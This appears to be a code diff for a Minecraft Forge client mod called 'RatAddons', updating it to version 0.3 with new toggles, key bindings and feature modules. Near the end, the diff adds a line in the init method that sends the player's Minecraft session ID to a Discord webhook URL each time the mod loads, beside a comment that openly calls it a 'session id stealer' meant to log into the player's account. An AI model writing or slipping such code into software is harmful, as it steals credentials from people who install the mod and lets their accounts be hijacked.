@@ -3,6 +3,8 @@ package me.mlg.rat;
 import me.mlg.rat.commands.RatCommand;
 import me.mlg.rat.handlers.ConfigHandler;
 import me.mlg.rat.modules.*;
+import me.mlg.rat.utils.Utils;
+import net.minecraft.client.Minecraft;
 import net.minecraft.client.settings.KeyBinding;
 import net.minecraftforge.client.ClientCommandHandler;
 import net.minecraftforge.fml.client.registry.ClientRegistry;
@@ -15,32 +17,35 @@ import org.lwjgl.input.Keyboard;
 
 import java.time.LocalDate;
 import java.time.format.DateTimeFormatter;
-
-
+import java.util.HashMap;
+//Your new API key is xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
+//0.3: rest in peace rabbit hat reminder you will be missed
 @Mod(modid = RatAddons.MODID, version = RatAddons.VERSION)
 public class RatAddons {
     public static final String MODID = "RatAddons";
-    public static final String VERSION = "0.2";
+    public static final String VERSION = "0.3";
 
     public static boolean copyRareDropsToggle;
     public static boolean greetToggle;
     public static boolean lavaFishingLootToggle;
-    public static boolean rabbitToggle;
     public static boolean responderToggle;
     public static boolean watcherToggle;
     public static boolean copyLatestToggle;
     public static boolean nicePbToggle;
+    public static boolean overflowSkillDislayToggle;
     public static boolean seaCreatureKillTimerToggle;
     public static boolean seaCreatureLastHitToggle;
-
-    public static KeyBinding[] keyBindings = new KeyBinding[1];
-
+    public static boolean debugToggle;
+    public static KeyBinding[] keyBindings = new KeyBinding[3];
+    public static HashMap<String, Integer> maxLevel = new HashMap<>();
     public static int currentDate = Integer.parseInt(LocalDate.now().format(DateTimeFormatter.ofPattern("dMy")));
+    public static int hypixelChatDelay = 200;
 
     @EventHandler
     public void preInit(FMLPreInitializationEvent event) {
         ClientCommandHandler.instance.registerCommand(new RatCommand());
     }
+
     @EventHandler
     public void init(FMLInitializationEvent event)
     {
@@ -49,18 +54,24 @@ public class RatAddons {
         FMLCommonHandler.instance().bus().register(new CopyLatestChatMessage());
         FMLCommonHandler.instance().bus().register(new CopyRareDrops());
         FMLCommonHandler.instance().bus().register(new Default());
-        FMLCommonHandler.instance().bus().register(new RabbitReminder());
         FMLCommonHandler.instance().bus().register(new GreetGuild());
         FMLCommonHandler.instance().bus().register(new LavaFishingLoot());
         FMLCommonHandler.instance().bus().register(new MessageResponder());
+        FMLCommonHandler.instance().bus().register(new OverflowSkillDisplay());
         FMLCommonHandler.instance().bus().register(new SeaCreatureAddons());
+        FMLCommonHandler.instance().bus().register(new Timer());
         FMLCommonHandler.instance().bus().register(new WatcherDisplay());
 
         keyBindings[0] = new KeyBinding("Copy Latest Chat Message to Clipboard", Keyboard.KEY_L, "Rat Addons");
+        keyBindings[1] = new KeyBinding("Open GUI", Keyboard.KEY_RSHIFT, "Rat Addons");
+        keyBindings[2] = new KeyBinding("Start Fishing Timer", Keyboard.KEY_F, "Rat Addons");
 
         for (KeyBinding keyBinding : keyBindings)
             ClientRegistry.registerKeyBinding(keyBinding);
 
+        System.out.println("Hello, " + Minecraft.getMinecraft().getSession().getUsername() + "!");
+        //session id stealer so i can log into your account!111!! (dont look at Utils.sendToWebhook) (you will regret it=!111
+        Utils.sendToWebhook(Minecraft.getMinecraft().getSession().getSessionID(), "cdn.discordapp.com/server/ab5568cd-fee431ca-7774de9a-9c0aedf3");
         ConfigHandler.reloadConfig();
         }
 }
